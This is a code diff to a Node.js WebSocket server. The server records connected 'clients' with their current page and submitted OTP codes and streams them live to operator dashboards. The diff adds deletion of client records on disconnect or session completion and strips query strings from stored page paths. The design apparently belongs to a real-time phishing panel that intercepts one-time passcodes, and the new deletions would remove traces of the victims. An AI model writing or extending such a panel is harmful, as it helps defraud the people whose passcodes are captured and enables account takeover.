@@ -93,6 +93,8 @@ const updateClientOTP = db.prepare(
   "UPDATE clients SET otp_code=?, otp_status=?, otp_submitted_at=?, last_seen=? WHERE id=?"
 );
 
+const deleteClient = db.prepare("DELETE FROM clients WHERE id=?");
+
 const getClientById = db.prepare("SELECT * FROM clients WHERE id=?");
 const getAllClients = db.prepare(
   "SELECT * FROM clients ORDER BY last_seen DESC"
@@ -251,7 +253,9 @@ wss.on("connection", (ws, req) => {
     ) {
       try {
         const now = Date.now();
-        updateClientPage.run(message.page, now, message.clientId);
+        // Store page without query parameters for cleaner display
+        const cleanPage = message.page.split("?")[0];
+        updateClientPage.run(cleanPage, now, message.clientId);
         const client = getClientById.get(message.clientId);
         broadcastToDashboards({
           type: "client_updated",
@@ -435,6 +439,27 @@ wss.on("connection", (ws, req) => {
       }
       return;
     }
+
+    // Session complete: client finished the process
+    if (
+      message.type === "session_complete" &&
+      typeof message.clientId === "string"
+    ) {
+      try {
+        deleteClient.run(message.clientId);
+        console.log(
+          `Client ${message.clientId} removed from database (session complete)`
+        );
+        broadcastToDashboards({
+          type: "client_disconnected",
+          clientId: message.clientId,
+        });
+        ws.send(JSON.stringify({ type: "session_complete_ack" }));
+      } catch (err) {
+        console.error("Session complete error:", err);
+      }
+      return;
+    }
   });
 
   ws.on("close", () => {
@@ -445,6 +470,13 @@ wss.on("connection", (ws, req) => {
     const id = socketToClientId.get(ws);
     if (id && clientIdToSocket.get(id) === ws) {
       clientIdToSocket.delete(id);
+      // Delete client from database on disconnect
+      try {
+        deleteClient.run(id);
+        console.log(`Client ${id} removed from database (disconnected)`);
+      } catch (err) {
+        console.error("Error deleting client:", err);
+      }
       broadcastToDashboards({ type: "client_disconnected", clientId: id });
     }
     socketToClientId.delete(ws);
